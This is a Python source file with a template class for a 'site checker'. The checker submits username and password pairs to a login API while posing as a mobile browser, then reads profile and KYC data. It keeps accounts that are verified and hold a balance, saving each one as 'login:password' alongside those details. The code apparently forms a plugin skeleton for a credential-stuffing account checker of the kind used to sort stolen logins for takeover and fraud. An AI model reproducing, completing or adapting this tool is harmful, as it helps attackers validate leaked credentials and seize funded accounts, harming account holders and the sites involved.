from core.base_checker import BaseChecker
from typing import Dict, Any
import requests

class TemplateChecker(BaseChecker):
    """Template for creating new site checkers"""
    
    # Configuration for this site
    LOGIN_URL = "https://example.com/api/login"
    PROFILE_URL = "https://example.com/api/profile"
    WALLET_URL = "https://example.com/api/wallet"
    
    HEADERS = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
    }
    
    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        """Check single account for this site"""
        try:
            # Login request
            payload = {
                "username": username,
                "password": password
            }
            
            response = self.session.post(
                self.LOGIN_URL,
                json=payload,
                headers=self.HEADERS,
                timeout=30
            )
            
            if response.status_code != 200:
                return {"status": "bad", "username": username}
            
            data = response.json()
            
            if not data.get("success", False):
                return {"status": "bad", "username": username}
            
            # Get profile info
            profile_response = self.session.get(
                self.PROFILE_URL,
                headers=self.HEADERS,
                timeout=30
            )
            
            profile = profile_response.json() if profile_response.status_code == 200 else {}
            
            # Your custom logic here
            account_data = {
                "login": username,
                "password": password,
                "balance": 0,
                "kyc_status": profile.get("kyc", False),
                # Add more fields as needed
            }
            
            return {
                "status": "valid",
                "account_data": account_data,
                "should_save": self.should_save(account_data)
            }
            
        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}
    
    def should_save(self, account_data: Dict[str, Any]) -> bool:
        """Define conditions for saving account"""
        # Example: Save if KYC verified and has balance
        return account_data.get("kyc_status", False) and account_data.get("balance", 0) > 0
    
    def save_format(self, account_data: Dict[str, Any]) -> str:
        """Format account data for saving to file"""
        return f"{account_data['login']}:{account_data['password']} | " \
               f"balance={account_data.get('balance', 0)} | " \
               f"kyc={account_data.get('kyc_status', False)}\n"